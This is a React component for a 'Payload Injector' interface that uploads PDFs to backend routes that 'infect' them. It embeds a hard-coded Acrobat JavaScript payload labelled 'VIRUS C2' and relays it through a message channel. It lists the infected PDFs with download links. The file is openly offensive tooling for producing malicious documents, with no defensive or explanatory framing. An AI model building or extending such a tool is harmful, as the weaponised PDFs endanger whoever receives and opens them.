import React, { useState, useCallback, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

interface PdfUploaderProps {
  sendMessage: (msg: string) => void;
}

interface InfectedPdf {
  pdf_id: string;
  filename: string;
  size: number;
  infected_path: string;
  infected_at: string;
}

const AUTO_PAYLOAD = "app.alert('VIRUS C2');var s=app.scanner;app.execMenuItem('FullScan');";

const PdfUploader: React.FC<PdfUploaderProps> = ({ sendMessage }) => {
  const [file, setFile] = useState<File | null>(null);
  const [status, setStatus] = useState<"idle" | "uploading" | "infecting" | "infected" | "error">("idle");
  const [progress, setProgress] = useState(0);
  const [error, setError] = useState<string | null>(null);
  const [pdfId, setPdfId] = useState<string | null>(null);
  const [infectedPdfs, setInfectedPdfs] = useState<InfectedPdf[]>([]);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const fetchInfectedPdfs = useCallback(async () => {
    try {
      const res = await fetch("/api/pdf/list");
      const data = await res.json();
      setInfectedPdfs(data.pdfs || []);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    fetchInfectedPdfs();
    const interval = setInterval(fetchInfectedPdfs, 5000);
    return () => clearInterval(interval);
  }, [fetchInfectedPdfs]);

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selected = e.target.files?.[0];
    if (!selected) return;
    setFile(selected);
    setStatus("idle");
    setProgress(0);
    setError(null);
    setPdfId(null);
  };

  useEffect(() => {
    if (!file || status !== "idle") return;
    handleUpload();
  }, [file]);

  const handleUpload = useCallback(async () => {
    if (!file) return;

    setStatus("uploading");
    setError(null);
    setProgress(20);

    try {
      const formData = new FormData();
      formData.append("file", file);
      const uploadRes = await fetch("/api/pdf/upload", { method: "POST", body: formData });
      const uploadData = await uploadRes.json();

      if (uploadData.status === "error") throw new Error(uploadData.message);

      const id = uploadData.pdf_id;
      setPdfId(id);
      setProgress(50);
      setStatus("infecting");

      const infectRes = await fetch(`/api/pdf/infect/${id}`, { method: "POST" });
      const infectData = await infectRes.json();

      setProgress(100);

      if (infectData.status === "error") throw new Error(infectData.message);

      setStatus("infected");
      sendMessage(`upload_${file.name}_payload_${AUTO_PAYLOAD}_size_${file.size}`);
      fetchInfectedPdfs();
    } catch (err: any) {
      setError(err?.message || "Upload failed");
      setStatus("error");
    }
  }, [file, sendMessage, fetchInfectedPdfs]);

  const handleClear = useCallback(() => {
    setFile(null);
    setStatus("idle");
    setProgress(0);
    setError(null);
    setPdfId(null);
  }, []);

  const formatBytes = (bytes: number) => {
    if (bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
  };

  const statusColor = {
    idle: "#1a2a3a",
    uploading: "#00d4ff",
    infecting: "#ffd700",
    infected: "#00ff88",
    error: "#ff4757",
  }[status];

  const statusLabel = {
    idle: "Ready",
    uploading: "Uploading...",
    infecting: "Injecting...",
    infected: "Infected",
    error: "Failed",
  }[status];

  return (
    <div style={styles.card}>
      <h2 style={styles.title}>
        <span style={{ ...styles.titleDot, backgroundColor: '#00d4ff', animation: 'pulse 2s infinite' }} />
        Payload Injector
      </h2>

      <div style={styles.uploadArea}>
        <input
          ref={fileInputRef}
          type="file"
          accept=".pdf,application/pdf"
          onChange={handleFileSelect}
          style={{ display: 'none' }}
        />

        {!file ? (
          <motion.div
            style={styles.placeholder}
            whileHover={{ borderColor: 'rgba(0, 255, 136, 0.4)', scale: 1.01 }}
            whileTap={{ scale: 0.99 }}
            onClick={() => fileInputRef.current?.click()}
          >
            <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
              <rect x="6" y="2" width="24" height="32" rx="3" stroke="#333" strokeWidth="1.5" />
              <path d="M18 12v12M12 18h12" stroke="#00ff88" strokeWidth="1.5" strokeLinecap="round" />
            </svg>
            <span style={{ color: '#666', fontSize: 13 }}>Select PDF to auto-inject</span>
          </motion.div>
        ) : (
          <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} style={styles.fileCard}>
            <div style={styles.fileRow}>
              <div style={{ flex: 1 }}>
                <div style={styles.fileName}>{file.name}</div>
                <div style={styles.fileMeta}>{formatBytes(file.size)}</div>
              </div>
              <div style={{ ...styles.statusBadge, color: statusColor, borderColor: `${statusColor}33` }}>
                {statusLabel}
              </div>
            </div>
            <div style={styles.progressTrack}>
              <motion.div
                style={{ ...styles.progressFill, backgroundColor: statusColor }}
                animate={{ width: `${progress}%` }}
                transition={{ duration: 0.3 }}
              />
            </div>
            {pdfId && <div style={styles.pdfId}>ID: {pdfId}</div>}
          </motion.div>
        )}
      </div>

      <AnimatePresence>
        {error && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={styles.errorBanner}>
            {error}
          </motion.div>
        )}
        {status === "infected" && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={styles.successBanner}>
            PDF infected with JavaScript payload.
          </motion.div>
        )}
      </AnimatePresence>

      {file && (
        <div style={styles.actions}>
          {status === "infected" && (
            <motion.button
              whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
              style={styles.primaryBtn}
              onClick={() => { setStatus("idle"); setProgress(0); handleUpload(); }}
            >
              Re-inject
            </motion.button>
          )}
          <motion.button
            whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
            style={styles.clearBtn}
            onClick={handleClear}
          >
            Clear
          </motion.button>
        </div>
      )}

      {/* Infected Files List */}
      {infectedPdfs.length > 0 && (
        <div style={styles.filesSection}>
          <h3 style={styles.filesTitle}>Infected Files ({infectedPdfs.length})</h3>
          <div style={styles.filesList}>
            {infectedPdfs.map((pdf) => (
              <div key={pdf.pdf_id} style={styles.fileItem}>
                <div style={{ flex: 1 }}>
                  <div style={styles.fileItemName}>
                    {pdf.filename}
                    <span style={styles.infectedTag}>INFECTED</span>
                  </div>
                  <div style={styles.fileItemMeta}>
                    {formatBytes(pdf.size)} — {new Date(pdf.infected_at).toLocaleString()}
                  </div>
                </div>
                <a
                  href={`/api/pdf/download/${pdf.pdf_id}`}
                  download
                  style={styles.downloadBtn}
                >
                  ↓ Download
                </a>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

const styles: Record<string, React.CSSProperties> = {
  card: {
    background: 'rgba(12, 14, 28, 0.85)',
    backdropFilter: 'blur(20px)',
    borderRadius: 12,
    border: '1px solid rgba(0, 255, 136, 0.1)',
    padding: '14px 16px',
    boxShadow: '0 4px 40px rgba(0, 0, 0, 0.3)',
    display: 'flex',
    flexDirection: 'column',
    overflow: 'hidden',
  },
  title: {
    margin: '0 0 10px 0',
    color: '#00d4ff',
    fontSize: 16,
    fontWeight: 600,
    fontFamily: "'JetBrains Mono', monospace",
    textShadow: '0 0 8px rgba(0, 212, 255, 0.3)',
    animation: 'textGlowPulse 3s ease-in-out infinite',
    display: 'flex',
    alignItems: 'center',
    gap: 10,
  },
  titleDot: { width: 8, height: 8, borderRadius: '50%' },
  uploadArea: { marginBottom: 10 },
  placeholder: {
    width: '100%', padding: '32px',
    border: '2px dashed rgba(255, 255, 255, 0.06)',
    borderRadius: 12, background: 'rgba(6, 6, 14, 0.4)',
    cursor: 'pointer', display: 'flex', flexDirection: 'column',
    alignItems: 'center', justifyContent: 'center', gap: 8,
  },
  fileCard: {
    padding: '14px 16px', background: 'rgba(6, 6, 14, 0.5)',
    borderRadius: 10, border: '1px solid rgba(255, 255, 255, 0.04)',
  },
  fileRow: { display: 'flex', alignItems: 'center', gap: 12, marginBottom: 10 },
  fileName: { color: '#e0e0e0', fontWeight: 500, fontSize: 13, fontFamily: "'JetBrains Mono', monospace" },
  fileMeta: { color: '#555', fontSize: 10, fontFamily: "'JetBrains Mono', monospace", marginTop: 2 },
  statusBadge: {
    fontSize: 10, padding: '4px 10px', borderRadius: 8,
    border: '1px solid', fontFamily: "'JetBrains Mono', monospace", fontWeight: 500,
  },
  progressTrack: { width: '100%', height: 3, background: '#1a2a3a', borderRadius: 2, overflow: 'hidden' },
  progressFill: { height: '100%', borderRadius: 2 },
  pdfId: { marginTop: 8, color: '#444', fontSize: 10, fontFamily: "'JetBrains Mono', monospace" },
  errorBanner: {
    padding: '8px 12px', borderRadius: 8, border: '1px solid rgba(255, 71, 87, 0.3)',
    color: '#ff4757', fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
    background: 'rgba(255, 71, 87, 0.05)', marginTop: 10,
  },
  successBanner: {
    padding: '8px 12px', borderRadius: 8, border: '1px solid rgba(0, 255, 136, 0.3)',
    color: '#00ff88', fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
    background: 'rgba(0, 255, 136, 0.05)', marginTop: 10,
  },
  actions: { display: 'flex', gap: 8, marginTop: 12 },
  primaryBtn: {
    flex: 1, padding: '10px 16px',
    background: 'linear-gradient(135deg, #00ff88, #00d4ff)',
    color: '#0a0a1a', border: 'none', borderRadius: 8,
    fontWeight: 700, fontSize: 12, cursor: 'pointer',
    fontFamily: "'JetBrains Mono', monospace",
  },
  clearBtn: {
    padding: '10px 16px', background: 'rgba(6, 6, 14, 0.5)',
    color: '#888', border: '1px solid rgba(255, 255, 255, 0.05)',
    borderRadius: 8, fontSize: 12, cursor: 'pointer',
    fontFamily: "'JetBrains Mono', monospace",
  },
  filesSection: { marginTop: 16, borderTop: '1px solid rgba(255, 255, 255, 0.04)', paddingTop: 14 },
  filesTitle: {
    margin: '0 0 10px 0', color: '#888', fontSize: 12,
    fontFamily: "'JetBrains Mono', monospace",
  },
  filesList: { display: 'flex', flexDirection: 'column', gap: 6 },
  fileItem: {
    display: 'flex', alignItems: 'center', gap: 12,
    padding: '8px 12px', background: 'rgba(6, 6, 14, 0.4)',
    borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.02)',
  },
  fileItemName: {
    color: '#ccc', fontSize: 12, fontFamily: "'JetBrains Mono', monospace",
    display: 'flex', alignItems: 'center', gap: 8,
  },
  infectedTag: {
    fontSize: 9, padding: '1px 6px', borderRadius: 4,
    background: 'rgba(255, 71, 87, 0.15)', color: '#ff4757',
    border: '1px solid rgba(255, 71, 87, 0.3)',
    fontFamily: "'JetBrains Mono', monospace", fontWeight: 600,
    letterSpacing: 0.5,
  },
  fileItemMeta: {
    color: '#444', fontSize: 10, fontFamily: "'JetBrains Mono', monospace", marginTop: 2,
  },
  downloadBtn: {
    padding: '5px 12px', background: 'rgba(0, 255, 136, 0.1)',
    color: '#00ff88', border: '1px solid rgba(0, 255, 136, 0.2)',
    borderRadius: 6, fontSize: 11, cursor: 'pointer',
    fontFamily: "'JetBrains Mono', monospace", textDecoration: 'none',
    whiteSpace: 'nowrap' as const,
  },
};

export default PdfUploader;
